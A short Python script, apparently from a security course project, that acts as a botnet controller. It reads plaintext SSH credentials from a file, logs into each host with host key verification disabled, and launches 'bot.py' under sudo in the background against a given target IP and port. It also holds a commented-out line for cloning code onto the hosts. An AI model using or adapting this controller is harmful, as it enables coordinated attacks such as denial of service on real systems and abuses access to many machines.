from pexpect import pxssh
import getpass
import re

def read_file(file_name):
    lines = [line.rstrip('\n') for line in open(file_name)]
    print(lines)
    return lines
def exe_command(s,cmd):
    s.sendline(cmd)
    s.prompt()
    #s.sendline('ls')
    #s.prompt()
    #print(s.before.decode('utf-8'))


def run_ssh(hostname,username,password,target_ip,target_port,mode,enable_multithreading):
    try:
        s = pxssh.pxssh(options={
                        "StrictHostKeyChecking": "no",
                        "UserKnownHostsFile": "/dev/null"})
        s.login(hostname, username, password)
        exe_command(s,"cd Desktop")
        exe_command(s,"cd cs460")
        exe_command(s,"chmod +x bot.py")
        ### assume no password when using sudo
        exe_command(s,"sudo nohup bot.py {} {} {} {} &".format(target_ip,target_port,mode,enable_multithreading))
        ###insert command here
        ###git clone git://github.com/SomeUser/SomeRepo.git
        ###add m_threading check
        s.logout()

    except pxssh.ExceptionPxssh as e:
        print("Failed to login")
        print(e)
    except pxssh.ExceptionPxssh.TIMEOUT:
    	print("timeout!")

def process_ssh_and_start(target_ip,target_port,mode,enable_multithreading):
    cred = read_file("../ssh_credential.txt")
    for i in cred:
        info = i.split(',')
        hostname = info[0]
        username = info[1]
        password = info[2]
        run_ssh(hostname,username,password,target_ip,target_port,mode,enable_multithreading)
        ###run ssh